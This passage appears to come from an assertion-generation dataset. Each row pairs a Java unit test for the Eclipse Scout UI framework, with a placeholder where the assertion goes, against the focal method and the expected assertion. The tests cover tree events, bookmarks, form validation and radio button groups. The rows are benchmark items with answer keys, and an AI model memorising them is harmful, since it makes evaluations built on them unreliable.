menus.getOrderedList()); setContextMenuInternal(contextMenu); }"	assertTrue(m_tree.isEnabled())
"testNotIgnoreCheckedAfterInsert() { LinkedList<TreeEvent> treeEvents = new LinkedList<>(); ITreeNode parentA = mockNode(""parent""); treeEvents.add(mockEvent(TreeEvent.TYPE_NODES_INSERTED, mockNode(""child"", parentA))); treeEvents.add(mockEvent(TreeEvent.TYPE_NODES_CHECKED, mockNode(""child"", parentA))); m_testBuffer.coalesce(treeEvents); ""<AssertPlaceHolder>""; }
coalesce(List<TreeEvent> events) { removeObsolete(events); removeNodesContainedInPreviousInsertEvents(events, CollectionUtility.hashSet( //why these types? This information is included on each inserted node. //once the event buffer is flushed, the individual inserted tree nodes will be //sent with their current (=latest) state. TreeEvent.TYPE_NODE_EXPANDED, TreeEvent.TYPE_NODE_EXPANDED_RECURSIVE, TreeEvent.TYPE_NODE_COLLAPSED, TreeEvent.TYPE_NODE_COLLAPSED_RECURSIVE, TreeEvent.TYPE_NODE_CHANGED, TreeEvent.TYPE_NODES_UPDATED, TreeEvent.TYPE_NODES_INSERTED)); removeEmptyEvents(events); removeIdenticalEvents(events); coalesceSameType(events); return events; }"	assertEquals(2, treeEvents.size())
"testGetNodeNoNodes() { ITree tree = mock(ITree.class); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION); ""<AssertPlaceHolder>""; }
getNode() { return CollectionUtility.firstElement(m_nodes); }"	assertNull(event.getNode())
"testGetNodeSingleNode() { ITree tree = mock(ITree.class); ITreeNode root = mockNode(""root""); ITreeNode node = mockNode(""a""); when(node.getParentNode()).thenReturn(root); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION, node); ""<AssertPlaceHolder>""; }
getNode() { return CollectionUtility.firstElement(m_nodes); }"	assertSame(node, event.getNode())
"testGetNodeMultipleNode() { ITree tree = mock(ITree.class); ITreeNode root = mockNode(""root""); ITreeNode nodeA = mockNode(""a""); ITreeNode nodeB = mockNode(""b""); when(nodeA.getParentNode()).thenReturn(root); when(nodeB.getParentNode()).thenReturn(root); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION, Arrays.asList(nodeB, nodeA)); ""<AssertPlaceHolder>""; }
getNode() { return CollectionUtility.firstElement(m_nodes); }"	assertSame(nodeB, event.getNode())
"testGetNodesNoNodes() { ITree tree = mock(ITree.class); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION); ""<AssertPlaceHolder>""; }
getNodes() { return CollectionUtility.arrayList(m_nodes); }"	assertEquals(Collections.emptyList(), event.getNodes())
"testGetNodesSingleNode() { ITree tree = mock(ITree.class); ITreeNode node = mockNode(""a""); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION, node); ""<AssertPlaceHolder>""; }
getNodes() { return CollectionUtility.arrayList(m_nodes); }"	assertEquals(Collections.singletonList(node), event.getNodes())
"testGetNodesMultipleNode() { ITree tree = mock(ITree.class); ITreeNode nodeA = mockNode(""a""); ITreeNode nodeB = mockNode(""b""); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION, Arrays.asList(nodeB, nodeA)); ""<AssertPlaceHolder>""; }
getNodes() { return CollectionUtility.arrayList(m_nodes); }"	assertEquals(Arrays.asList(nodeB, nodeA), event.getNodes())
"testHasNodesNoNodes() { ITree tree = mock(ITree.class); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION); ""<AssertPlaceHolder>""; }
hasNodes() { return m_nodes == null ? false : !m_nodes.isEmpty(); }"	assertFalse(event.hasNodes())
"testHasNodesSingleNode() { ITree tree = mock(ITree.class); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION, mockNode(""a"")); ""<AssertPlaceHolder>""; }
hasNodes() { return m_nodes == null ? false : !m_nodes.isEmpty(); }"	assertTrue(event.hasNodes())
"testHasNodesMultipleNode() { ITree tree = mock(ITree.class); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION, mockNodes(""a"", ""b"")); ""<AssertPlaceHolder>""; }
hasNodes() { return m_nodes == null ? false : !m_nodes.isEmpty(); }"	assertTrue(event.hasNodes())
"testGetNodeCountNoNodes() { ITree tree = mock(ITree.class); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION); ""<AssertPlaceHolder>""; }
getNodeCount() { return m_nodes == null ? 0 : m_nodes.size(); }"	assertEquals(0, event.getNodeCount())
"testGetNodeCountSingleNode() { ITree tree = mock(ITree.class); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION, mockNode(""a"")); ""<AssertPlaceHolder>""; }
getNodeCount() { return m_nodes == null ? 0 : m_nodes.size(); }"	assertEquals(1, event.getNodeCount())
"testGetNodeCountMultipleNode() { ITree tree = mock(ITree.class); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION, mockNodes(""a"", ""b"")); ""<AssertPlaceHolder>""; }
getNodeCount() { return m_nodes == null ? 0 : m_nodes.size(); }"	assertEquals(2, event.getNodeCount())
"testContainsNodeNoNodes() { ITree tree = mock(ITree.class); ITreeNode nodeA = mockNode(""a""); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION); ""<AssertPlaceHolder>""; }
containsNode(ITreeNode nodeToFind) { if (CollectionUtility.isEmpty(m_nodes)) { return false; } for (ITreeNode node : m_nodes) { if (ObjectUtility.equals(node, nodeToFind)) { return true; } } return false; }"	assertFalse(event.containsNode(nodeA))
"testContainsNodeSingleNode() { ITree tree = mock(ITree.class); ITreeNode nodeA = mockNode(""a""); TreeEvent event = new TreeEvent(tree, TreeEvent.TYPE_NODE_ACTION, nodeA); ""<AssertPlaceHolder>""; }
containsNode(ITreeNode nodeToFind) { if (CollectionUtility.isEmpty(m_nodes)) { return false; } for (ITreeNode node : m_nodes) { if (ObjectUtility.equals(node, nodeToFind)) { return true; } } return false; }"	assertTrue(event.containsNode(nodeA))
"testCalculateCommonParentNodeOneNodeWithoutParent() { ITreeNode nodeA = mockNode(""a"", null); ""<AssertPlaceHolder>""; }
calculateCommonParentNode(Collection<? extends ITreeNode> nodes) { if (CollectionUtility.isEmpty(nodes)) { return null; } Iterator<? extends ITreeNode> nodeIt = nodes.iterator(); final ITreeNode commonParent = nodeIt.next().getParentNode(); while (nodeIt.hasNext()) { if (nodeIt.next().getParentNode() != commonParent) { return null; } } return commonParent; }"	assertNull(TreeUtility.calculateCommonParentNode(Collections.singleton(nodeA)))
"testCalculateCommonParentNodeOneNodeWithParent() { ITreeNode rootNode = mockNode(""root"", null); ITreeNode nodeA = mockNode(""a"", rootNode); ""<AssertPlaceHolder>""; }
calculateCommonParentNode(Collection<? extends ITreeNode> nodes) { if (CollectionUtility.isEmpty(nodes)) { return null; } Iterator<? extends ITreeNode> nodeIt = nodes.iterator(); final ITreeNode commonParent = nodeIt.next().getParentNode(); while (nodeIt.hasNext()) { if (nodeIt.next().getParentNode() != commonParent) { return null; } } return commonParent; }"	assertSame(rootNode, TreeUtility.calculateCommonParentNode(Collections.singleton(nodeA)))
"testIsOutlineChanging_Default() { prepareMockDesktopWithOutline(); ""<AssertPlaceHolder>""; }
isOutlineChanging() { return m_outlineChanging; }"	assertFalse(m_desktop.isOutlineChanging())
"testUnsavedForms() { TestEnvironmentDesktop desktop = (TestEnvironmentDesktop) IDesktop.CURRENT.get();  P_CheckSaveTestForm testForm = new P_CheckSaveTestForm(); try { testForm.startNew(); testForm.getMessageField().setValue(""test""); ""<AssertPlaceHolder>""; } finally { testForm.doClose(); } }
getUnsavedForms() { return getUnsavedForms(null); }"	assertTrue(desktop.getUnsavedForms().contains(testForm))
"testDataChangedChanging() { TestEnvironmentDesktop desktop = (TestEnvironmentDesktop) IDesktop.CURRENT.get();  final HashSet<Object> resultHolder = new HashSet<>(); desktop.addDataChangeListener(e -> resultHolder.add(e.getDataType()), TEST_DATA_TYPE_1, TEST_DATA_TYPE_2);  desktop.setDataChanging(true); desktop.dataChanged(TEST_DATA_TYPE_1); desktop.dataChanged(TEST_DATA_TYPE_1, TEST_DATA_TYPE_1, TEST_DATA_TYPE_1); desktop.dataChanged(TEST_DATA_TYPE_2, TEST_DATA_TYPE_2); desktop.dataChanged(TEST_DATA_TYPE_1, TEST_DATA_TYPE_2); desktop.dataChanged(TEST_DATA_TYPE_1); desktop.dataChanged(TEST_DATA_TYPE_2); desktop.setDataChanging(false); ""<AssertPlaceHolder>""; }
setDataChanging(boolean b) { if (b) { m_dataChanging++; } else if (m_dataChanging > 0) { m_dataChanging--; } m_dataChangeListeners.setBuffering(isDataChanging()); m_dataChangeDesktopInForegroundListeners.setBuffering(isDataChanging() || isInBackground()); }"	assertEquals(CollectionUtility.hashSet(TEST_DATA_TYPE_1, TEST_DATA_TYPE_2), resultHolder)
"testBookmarkArrayKeyLegacy() { Bookmark[] in = new Bookmark[]{new Bookmark()}; Object out = BookmarkUtility.makeSerializableKey(in, true); ""<AssertPlaceHolder>""; }
makeSerializableKey(Object o, boolean useLegacySupport) { if (o == null) { return o; } else if (o instanceof Number) { return o; } else if (o instanceof String) { return o; } else if (o instanceof Boolean) { return o; } else if (o instanceof Date) { return o; } else if (o instanceof Collection) { List<Object> result = new ArrayList<>(); for (Object oi : (Iterable) o) { result.add(makeSerializableKey(oi, useLegacySupport)); } return result; } else if (o.getClass().isArray()) { ArrayList<Integer> dimList = new ArrayList<>(); Class xc = o.getClass(); Object xo = o; while (xc.isArray()) { int len = xo != null ? Array.getLength(xo) : 0; dimList.add(len); xc = xc.getComponentType(); if (xo != null && len > 0) { xo = Array.get(xo, 0); } } int[] dim = new int[dimList.size()]; for (int i = 0; i < dim.length; i++) { dim[i] = dimList.get(i); } Object b = Array.newInstance(makeSerializableClass(xc, useLegacySupport), dim); for (int i = 0; i < dim[0]; i++) { Array.set(b, i, makeSerializableKey(Array.get(o, i), useLegacySupport)); } return b; } else if (!useLegacySupport && o instanceof Serializable) { return o; } else { // check if key object overrides toString() if (!useLegacySupport && !(o instanceof String)) { if (ConfigurationUtility.isMethodOverwrite(Object.class, ""toString"", new Class[0], o.getClass())) { LOG.warn(""Bookmark key is not serializable. Falling back to toString(). Note: keys may not be stable [class={}, string representation:{}]"", o.getClass(), o); } else { LOG.error(""Bookmark key is not serializable. Falling back to toString() which is not overriden by the given class [{}]"", o.getClass()); } } return o.toString(); } }"	assertTrue(out instanceof String[])
"testBookmarkArrayKey() { Bookmark[] in = new Bookmark[]{new Bookmark()}; Object out = BookmarkUtility.makeSerializableKey(in, false); ""<AssertPlaceHolder>""; }
makeSerializableKey(Object o, boolean useLegacySupport) { if (o == null) { return o; } else if (o instanceof Number) { return o; } else if (o instanceof String) { return o; } else if (o instanceof Boolean) { return o; } else if (o instanceof Date) { return o; } else if (o instanceof Collection) { List<Object> result = new ArrayList<>(); for (Object oi : (Iterable) o) { result.add(makeSerializableKey(oi, useLegacySupport)); } return result; } else if (o.getClass().isArray()) { ArrayList<Integer> dimList = new ArrayList<>(); Class xc = o.getClass(); Object xo = o; while (xc.isArray()) { int len = xo != null ? Array.getLength(xo) : 0; dimList.add(len); xc = xc.getComponentType(); if (xo != null && len > 0) { xo = Array.get(xo, 0); } } int[] dim = new int[dimList.size()]; for (int i = 0; i < dim.length; i++) { dim[i] = dimList.get(i); } Object b = Array.newInstance(makeSerializableClass(xc, useLegacySupport), dim); for (int i = 0; i < dim[0]; i++) { Array.set(b, i, makeSerializableKey(Array.get(o, i), useLegacySupport)); } return b; } else if (!useLegacySupport && o instanceof Serializable) { return o; } else { // check if key object overrides toString() if (!useLegacySupport && !(o instanceof String)) { if (ConfigurationUtility.isMethodOverwrite(Object.class, ""toString"", new Class[0], o.getClass())) { LOG.warn(""Bookmark key is not serializable. Falling back to toString(). Note: keys may not be stable [class={}, string representation:{}]"", o.getClass(), o); } else { LOG.error(""Bookmark key is not serializable. Falling back to toString() which is not overriden by the given class [{}]"", o.getClass()); } } return o.toString(); } }"	assertTrue(out instanceof Bookmark[])
"testBookmarkKeyLegacy() { Bookmark in = new Bookmark(); Object out = BookmarkUtility.makeSerializableKey(in, true); ""<AssertPlaceHolder>""; }
makeSerializableKey(Object o, boolean useLegacySupport) { if (o == null) { return o; } else if (o instanceof Number) { return o; } else if (o instanceof String) { return o; } else if (o instanceof Boolean) { return o; } else if (o instanceof Date) { return o; } else if (o instanceof Collection) { List<Object> result = new ArrayList<>(); for (Object oi : (Iterable) o) { result.add(makeSerializableKey(oi, useLegacySupport)); } return result; } else if (o.getClass().isArray()) { ArrayList<Integer> dimList = new ArrayList<>(); Class xc = o.getClass(); Object xo = o; while (xc.isArray()) { int len = xo != null ? Array.getLength(xo) : 0; dimList.add(len); xc = xc.getComponentType(); if (xo != null && len > 0) { xo = Array.get(xo, 0); } } int[] dim = new int[dimList.size()]; for (int i = 0; i < dim.length; i++) { dim[i] = dimList.get(i); } Object b = Array.newInstance(makeSerializableClass(xc, useLegacySupport), dim); for (int i = 0; i < dim[0]; i++) { Array.set(b, i, makeSerializableKey(Array.get(o, i), useLegacySupport)); } return b; } else if (!useLegacySupport && o instanceof Serializable) { return o; } else { // check if key object overrides toString() if (!useLegacySupport && !(o instanceof String)) { if (ConfigurationUtility.isMethodOverwrite(Object.class, ""toString"", new Class[0], o.getClass())) { LOG.warn(""Bookmark key is not serializable. Falling back to toString(). Note: keys may not be stable [class={}, string representation:{}]"", o.getClass(), o); } else { LOG.error(""Bookmark key is not serializable. Falling back to toString() which is not overriden by the given class [{}]"", o.getClass()); } } return o.toString(); } }"	assertTrue(out instanceof String)
"testBookmarkKey() { Bookmark in = new Bookmark(); Object out = BookmarkUtility.makeSerializableKey(in, false); ""<AssertPlaceHolder>""; }
makeSerializableKey(Object o, boolean useLegacySupport) { if (o == null) { return o; } else if (o instanceof Number) { return o; } else if (o instanceof String) { return o; } else if (o instanceof Boolean) { return o; } else if (o instanceof Date) { return o; } else if (o instanceof Collection) { List<Object> result = new ArrayList<>(); for (Object oi : (Iterable) o) { result.add(makeSerializableKey(oi, useLegacySupport)); } return result; } else if (o.getClass().isArray()) { ArrayList<Integer> dimList = new ArrayList<>(); Class xc = o.getClass(); Object xo = o; while (xc.isArray()) { int len = xo != null ? Array.getLength(xo) : 0; dimList.add(len); xc = xc.getComponentType(); if (xo != null && len > 0) { xo = Array.get(xo, 0); } } int[] dim = new int[dimList.size()]; for (int i = 0; i < dim.length; i++) { dim[i] = dimList.get(i); } Object b = Array.newInstance(makeSerializableClass(xc, useLegacySupport), dim); for (int i = 0; i < dim[0]; i++) { Array.set(b, i, makeSerializableKey(Array.get(o, i), useLegacySupport)); } return b; } else if (!useLegacySupport && o instanceof Serializable) { return o; } else { // check if key object overrides toString() if (!useLegacySupport && !(o instanceof String)) { if (ConfigurationUtility.isMethodOverwrite(Object.class, ""toString"", new Class[0], o.getClass())) { LOG.warn(""Bookmark key is not serializable. Falling back to toString(). Note: keys may not be stable [class={}, string representation:{}]"", o.getClass(), o); } else { LOG.error(""Bookmark key is not serializable. Falling back to toString() which is not overriden by the given class [{}]"", o.getClass()); } } return o.toString(); } }"	assertTrue(out instanceof Bookmark)
"testMakeSerializableNullKey() { Object in = null; Object out = BookmarkUtility.makeSerializableKey(in, false); ""<AssertPlaceHolder>""; }
makeSerializableKey(Object o, boolean useLegacySupport) { if (o == null) { return o; } else if (o instanceof Number) { return o; } else if (o instanceof String) { return o; } else if (o instanceof Boolean) { return o; } else if (o instanceof Date) { return o; } else if (o instanceof Collection) { List<Object> result = new ArrayList<>(); for (Object oi : (Iterable) o) { result.add(makeSerializableKey(oi, useLegacySupport)); } return result; } else if (o.getClass().isArray()) { ArrayList<Integer> dimList = new ArrayList<>(); Class xc = o.getClass(); Object xo = o; while (xc.isArray()) { int len = xo != null ? Array.getLength(xo) : 0; dimList.add(len); xc = xc.getComponentType(); if (xo != null && len > 0) { xo = Array.get(xo, 0); } } int[] dim = new int[dimList.size()]; for (int i = 0; i < dim.length; i++) { dim[i] = dimList.get(i); } Object b = Array.newInstance(makeSerializableClass(xc, useLegacySupport), dim); for (int i = 0; i < dim[0]; i++) { Array.set(b, i, makeSerializableKey(Array.get(o, i), useLegacySupport)); } return b; } else if (!useLegacySupport && o instanceof Serializable) { return o; } else { // check if key object overrides toString() if (!useLegacySupport && !(o instanceof String)) { if (ConfigurationUtility.isMethodOverwrite(Object.class, ""toString"", new Class[0], o.getClass())) { LOG.warn(""Bookmark key is not serializable. Falling back to toString(). Note: keys may not be stable [class={}, string representation:{}]"", o.getClass(), o); } else { LOG.error(""Bookmark key is not serializable. Falling back to toString() which is not overriden by the given class [{}]"", o.getClass()); } } return o.toString(); } }"	assertNull(out)
"testDisposeSearchForm() { // Setup final TestSearchForm searchForm = new TestSearchForm(); final TestSearchForm searchFormMock = Mockito.spy(searchForm); final ITable tableMock = Mockito.mock(ITable.class); AbstractPageWithTable<ITable> pageWithSearchForm = new AbstractPageWithTable<ITable>() {  @Override protected ITable createTable() { return tableMock; }  @Override protected ISearchForm createSearchForm() { return searchFormMock; } };  // Begin test pageWithSearchForm.ensureSearchFormCreated(); pageWithSearchForm.ensureSearchFormStarted(); Mockito.verify(searchFormMock, Mockito.times(0)).disposeFormInternal();  pageWithSearchForm.dispose(); Mockito.verify(searchFormMock, Mockito.times(1)).disposeFormInternal();  // Assert that the table is still null and not created again after detaching the search form -> Never create table while page is disposing ""<AssertPlaceHolder>""; Mockito.verify(tableMock, Mockito.times(0)).init(); }
ensureSearchFormStarted() { if (m_searchForm != null && m_searchForm.isFormStartable()) { try { m_searchForm.start(); fireAfterSearchFormStart(); ensureSearchControlSelected(); } catch (Exception e) { BEANS.get(ExceptionHandler.class).handle(new ProcessingException(""error creating search form '"" + m_searchForm.getClass().getName() + ""' for page '"" + getClass().getName() + ""'."", e)); } } }"	assertNull(pageWithSearchForm.getTable(false))
"testClassIdAnnotated() { TestFormWithClassId form = new TestFormWithClassId(); ""<AssertPlaceHolder>""; testClassIdSetter(form, FORM_TEST_CLASS_ID); }
classId() { if (m_classId != null) { return m_classId; } return super.classId(); }"	assertEquals(FORM_TEST_CLASS_ID, form.classId())
"testClassIdNoAnnotation() { TestForm form = new TestForm(); ""<AssertPlaceHolder>""; testClassIdSetter(form, form.classId()); }
classId() { if (m_classId != null) { return m_classId; } return super.classId(); }"	"assertFalse(""ClassId should always be set."", StringUtility.isNullOrEmpty(form.classId()))"
"testVetoExceptionHtmlMessage() { TestFormWithMandatoryField form = new TestFormWithMandatoryField(); String htmlErrorMessage = """";  String expectedErrorMessage = HTML.fragment( HTML.div(TEXTS.get(""FormEmptyMandatoryFieldsMessage"")), HTML.ul(HTML.li(form.getStringField().getFullyQualifiedLabel(IValidateContentDescriptor.LABEL_SEPARATOR)))) .toHtml();  try { form.validateForm(); } catch (VetoException ve) { htmlErrorMessage = ve.getHtmlMessage().toHtml(); }  ""<AssertPlaceHolder>""; }
validateForm() { if (!interceptCheckFields()) { VetoException veto = new VetoException(""Validate "" + getClass().getSimpleName()); veto.consume(); throw veto; } if (!getHandler().onCheckFields()) { VetoException veto = new VetoException(""Validate "" + getClass().getSimpleName()); veto.consume(); throw veto; }  // check all fields that might be invalid FormFieldErrorCollector collector = createFormFieldErrorCollector(); visit(collector, IFormField.class); collector.firstProblem() .ifPresent(firstProblem -> handleFormErrors(firstProblem, collector.messagesOfInvalidFields(), collector.messagesOfMandatoryFields()));  if (!interceptValidate()) { VetoException veto = new VetoException(""Validate "" + getClass().getSimpleName()); veto.consume(); throw veto; } if (!getHandler().onValidate()) { VetoException veto = new VetoException(""Validate "" + getClass().getSimpleName()); veto.consume(); throw veto; } }"	assertEquals(expectedErrorMessage, htmlErrorMessage)
"testVetoExceptionHtmlMessageWithHtmlLabel() { TestFormWithMandatoryField form = new TestFormWithMandatoryField(); form.getStringField().setLabelHtmlEnabled(true); form.getStringField().setLabel(HTML.italic(""String"") + "" "" + HTML.bold(""Field"")); String htmlErrorMessage = """";  String expectedErrorMessage = HTML.fragment( HTML.div(TEXTS.get(""FormEmptyMandatoryFieldsMessage"")), HTML.ul(HTML.li(form.getMainBox().getFullyQualifiedLabel(IValidateContentDescriptor.LABEL_SEPARATOR) + IValidateContentDescriptor.LABEL_SEPARATOR + ""String Field""))) .toHtml();  try { form.validateForm(); } catch (VetoException ve) { htmlErrorMessage = ve.getHtmlMessage().toHtml(); }  ""<AssertPlaceHolder>""; }
validateForm() { if (!interceptCheckFields()) { VetoException veto = new VetoException(""Validate "" + getClass().getSimpleName()); veto.consume(); throw veto; } if (!getHandler().onCheckFields()) { VetoException veto = new VetoException(""Validate "" + getClass().getSimpleName()); veto.consume(); throw veto; }  // check all fields that might be invalid FormFieldErrorCollector collector = createFormFieldErrorCollector(); visit(collector, IFormField.class); collector.firstProblem() .ifPresent(firstProblem -> handleFormErrors(firstProblem, collector.messagesOfInvalidFields(), collector.messagesOfMandatoryFields()));  if (!interceptValidate()) { VetoException veto = new VetoException(""Validate "" + getClass().getSimpleName()); veto.consume(); throw veto; } if (!getHandler().onValidate()) { VetoException veto = new VetoException(""Validate "" + getClass().getSimpleName()); veto.consume(); throw veto; } }"	assertEquals(expectedErrorMessage, htmlErrorMessage)
"testParseValueInternalNull() { ""<AssertPlaceHolder>""; }
parseValueInternal(String text) { return parseToBigDecimalInternal(text); }"	"assertEquals(""expected null return for null input"", null, parseValueInternal(null))"
"testParseValueInternalNull() { ""<AssertPlaceHolder>""; }
parseValueInternal(String text) { BigInteger retVal = null; BigDecimal parsedVal = parseToBigDecimalInternal(text); if (parsedVal != null) { retVal = parsedVal.toBigIntegerExact(); } return retVal; }"	"assertEquals(""expected null return for null input"", null, parseValueInternal(null))"
"testParseValueInternalNull() { ""<AssertPlaceHolder>""; }
parseValueInternal(String text) { Integer retVal = null; BigDecimal parsedVal = parseToBigDecimalInternal(text); if (parsedVal != null) { retVal = parsedVal.intValueExact(); } return retVal; }"	"assertEquals(""expected null return for null input"", null, parseValueInternal(null))"
"testParseValueInternalNull() { ""<AssertPlaceHolder>""; }
parseValueInternal(String text) { Long retVal = null; BigDecimal parsedVal = parseToBigDecimalInternal(text); if (parsedVal != null) { retVal = parsedVal.longValueExact(); } return retVal; }"	"assertEquals(""expected null return for null input"", null, parseValueInternal(null))"
"testInvalidSelectionViaButton() { m_group.selectButton(new AbstractRadioButton<Long>() { }); ""<AssertPlaceHolder>""; }
getSelectedButton() { return getButtonFor(getSelectedKey()); }"	assertNull(m_group.getSelectedButton())
"testDisplayTextInitial() { AbstractRadioButtonGroup<Long> lookupGroup = new P_RadioButtonGroupWithLookupCall(); lookupGroup.initConfig(); ""<AssertPlaceHolder>""; }
initConfig() { m_fields = CollectionUtility.emptyArrayList(); m_movedFormFieldsByClass = new HashMap<>(); m_fieldPropertyChangeListener = new P_FieldPropertyChangeListenerEx(); m_grid = createGrid(); super.initConfig(); // Configured CodeType if (getConfiguredCodeType() != null) { setCodeTypeClass(getConfiguredCodeType()); } // Configured LookupCall Class<? extends ILookupCall<T>> lookupCallClass = getConfiguredLookupCall(); if (lookupCallClass != null) { ILookupCall<T> call = BEANS.get(lookupCallClass); setLookupCall(call); } // add fields List<Class<? extends IFormField>> configuredFields = getConfiguredFields(); List<IFormField> contributedFields = m_contributionHolder.getContributionsByClass(IFormField.class); OrderedCollection<IFormField> fields = new OrderedCollection<>(); for (Class<? extends IFormField> fieldClazz : configuredFields) { fields.addOrdered(ConfigurationUtility.newInnerInstance(this, fieldClazz)); } fields.addAllOrdered(contributedFields); injectFieldsInternal(fields); for (IFormField f : fields) { connectFields(f, this); } m_fields = fields.getOrderedList(); //attach a proxy controller to each child field in the group for: visible, saveNeeded for (IFormField f : m_fields) { f.addPropertyChangeListener(m_fieldPropertyChangeListener); } //extract buttons from field subtree List<IRadioButton<T>> buttonList = new ArrayList<>(); for (IFormField f : m_fields) { IRadioButton<T> b = findFirstButtonInFieldTree(f); if (b != null) { buttonList.add(b); } } m_radioButtons = buttonList; //decorate radio buttons for (IRadioButton b : m_radioButtons) { b.addPropertyChangeListener(new P_ButtonPropertyChangeListener()); } setGridColumnCount(getConfiguredGridColumnCount()); setLayoutConfig(getConfiguredLayoutConfig()); handleFieldVisibilityChanged(); }"	"assertEquals("""", lookupGroup.getDisplayText())"
"testDisplayTextSelectKey() { AbstractRadioButtonGroup<Long> lookupGroup = new P_RadioButtonGroupWithLookupCall(); lookupGroup.initConfig(); lookupGroup.selectKey(1L); ""<AssertPlaceHolder>""; }
selectKey(T key) { setValue(key); }"	"assertEquals(""Business Systems Integration AG"", lookupGroup.getDisplayText())"
"testDisplayTextSelectNull() { AbstractRadioButtonGroup<Long> lookupGroup = new P_RadioButtonGroupWithLookupCall(); lookupGroup.initConfig(); lookupGroup.selectKey(null); ""<AssertPlaceHolder>""; }
selectKey(T key) { setValue(key); }"	"assertEquals("""", lookupGroup.getDisplayText())"
"testCreateParentMap_EmptyTree() { ITree tree = createTestTree(); Map<Long, ILookupRow<Long>> parentMap = new IncrementalTreeBuilder<Long>(null) .createParentMap(tree); ""<AssertPlaceHolder>""; }
createParentMap(ITree tree) { final Map<LOOKUP_KEY, ILookupRow<LOOKUP_KEY>> map = new HashMap<>(); IDepthFirstTreeVisitor<ITreeNode> v = new DepthFirstTreeVisitor<ITreeNode>() { @Override public TreeVisitResult preVisit(ITreeNode node, int level, int index) { ITreeNode parent = node.getParentNode(); ILookupRow<LOOKUP_KEY> row = getLookupRow(node); if (row != null) { LOOKUP_KEY key = row.getKey(); m_keyCache.put(key, row); map.put(key, getLookupRow(parent)); } return TreeVisitResult.CONTINUE; } };  tree.visitTree(v); return map; }"	assertTrue(parentMap.isEmpty())
"testCreatePaths_Empty() { ITree tree = createTestTree(); IncrementalTreeBuilder<Long> builder = new IncrementalTreeBuilder<>(null); ArrayList<ILookupRow<Long>> rows = new ArrayList<>(); List<List<ILookupRow<Long>>> paths = builder.createPaths(rows, tree); ""<AssertPlaceHolder>""; }
createPaths(Collection<? extends ILookupRow<LOOKUP_KEY>> lookupRows, ITree existingTree) { Map<LOOKUP_KEY, ILookupRow<LOOKUP_KEY>> parentMap = createParentMap(existingTree); List<List<ILookupRow<LOOKUP_KEY>>> paths = new ArrayList<>(); for (ILookupRow<LOOKUP_KEY> row : lookupRows) { // build path to root for this row List<ILookupRow<LOOKUP_KEY>> path = new ArrayList<>(); ILookupRow<LOOKUP_KEY> r = row; while (r != null) { path.add(0, r); LOOKUP_KEY parentKey = r.getParentKey(); if (parentKey == null) { // no parent break; } if (!parentMap.containsKey(r.getKey())) { ILookupRow<LOOKUP_KEY> parentRow = getLookupRow(parentKey); parentMap.put(r.getKey(), parentRow); } r = parentMap.get(r.getKey()); } paths.add(path); } return paths; }"	assertTrue(paths.isEmpty())
"testCreatePaths_NonEmpty() { @SuppressWarnings(""unchecked"") ILookupRowByKeyProvider<Long> mockProvider = Mockito.mock(ILookupRowByKeyProvider.class); ITree tree = createTestTree(); IncrementalTreeBuilder<Long> builder = new IncrementalTreeBuilder<>(mockProvider); ArrayList<ILookupRow<Long>> rows = new ArrayList<>(); rows.add(new LookupRow<>(1L, """")); rows.add(new LookupRow<>(2L, """").withParentKey(1L)); List<List<ILookupRow<Long>>> paths = builder.createPaths(rows, tree); ""<AssertPlaceHolder>""; }
createPaths(Collection<? extends ILookupRow<LOOKUP_KEY>> lookupRows, ITree existingTree) { Map<LOOKUP_KEY, ILookupRow<LOOKUP_KEY>> parentMap = createParentMap(existingTree); List<List<ILookupRow<LOOKUP_KEY>>> paths = new ArrayList<>(); for (ILookupRow<LOOKUP_KEY> row : lookupRows) { // build path to root for this row List<ILookupRow<LOOKUP_KEY>> path = new ArrayList<>(); ILookupRow<LOOKUP_KEY> r = row; while (r != null) { path.add(0, r); LOOKUP_KEY parentKey = r.getParentKey(); if (parentKey == null) { // no parent break; } if (!parentMap.containsKey(r.getKey())) { ILookupRow<LOOKUP_KEY> parentRow = getLookupRow(parentKey); parentMap.put(r.getKey(), parentRow); } r = parentMap.get(r.getKey()); } paths.add(path); } return paths; }"	assertTrue(paths.size() == 2)
"testCreatePaths_NullKeyLookupRow() { final Map<Long, ILookupRow<Long>> lookupRowsMap = new HashMap<>(); lookupRowsMap.put(1L, new LookupRow<>(1L, ""A"")); lookupRowsMap.put(2L, new LookupRow<>(2L, ""A-B"").withParentKey(1L)); lookupRowsMap.put(null, new LookupRow<>(null, ""(none)"")); Collection<ILookupRow<Long>> rows = lookupRowsMap.values();  ILookupRowByKeyProvider<Long> provider = key -> lookupRowsMap.get(key);  ITree tree = createTestTree(); IncrementalTreeBuilder<Long> builder = new IncrementalTreeBuilder<>(provider);  List<List<ILookupRow<Long>>> paths = builder.createPaths(rows, tree); ""<AssertPlaceHolder>""; }
createPaths(Collection<? extends ILookupRow<LOOKUP_KEY>> lookupRows, ITree existingTree) { Map<LOOKUP_KEY, ILookupRow<LOOKUP_KEY>> parentMap = createParentMap(existingTree); List<List<ILookupRow<LOOKUP_KEY>>> paths = new ArrayList<>(); for (ILookupRow<LOOKUP_KEY> row : lookupRows) { // build path to root for this row List<ILookupRow<LOOKUP_KEY>> path = new ArrayList<>(); ILookupRow<LOOKUP_KEY> r = row; while (r != null) { path.add(0, r); LOOKUP_KEY parentKey = r.getParentKey(); if (parentKey == null) { // no parent break; } if (!parentMap.containsKey(r.getKey())) { ILookupRow<LOOKUP_KEY> parentRow = getLookupRow(parentKey); parentMap.put(r.getKey(), parentRow); } r = parentMap.get(r.getKey()); } paths.add(path); } return paths; }"	assertEquals(3, paths.size())
"testSetTableStatusToTable() { IStatus status = new Status(""Hello hello"", IStatus.ERROR); setTableStatus(status); Assert.""<AssertPlaceHolder>""; }
